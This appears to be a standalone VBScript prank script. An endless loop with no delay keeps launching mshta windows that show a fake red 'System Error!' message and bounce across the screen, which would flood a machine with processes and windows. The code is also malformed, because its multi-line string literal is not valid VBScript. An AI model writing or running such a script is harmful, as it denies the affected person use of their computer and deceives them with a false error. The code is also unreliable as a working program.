Set shell = CreateObject("WScript.Shell")

Do
    shell.Run "mshta ""javascript:
        var x=0, y=0, dx=10, dy=10;
        var win = window.open('', '', 'width=300,height=100,top=0,left=0');
        win.document.write('<body style=\'margin:0;font-family:sans-serif;background:#fff\'><h3 style=\'color:red;text-align:center;margin-top:30px\'>System Error!</h3></body>');
        setInterval(function(){
            x += dx; y += dy;
            if(x > screen.width - 300 || x < 0) dx *= -1;
            if(y > screen.height - 100 || y < 0) dy *= -1;
            win.moveTo(x, y);
        }, 20);
    """, 0, False
Loop
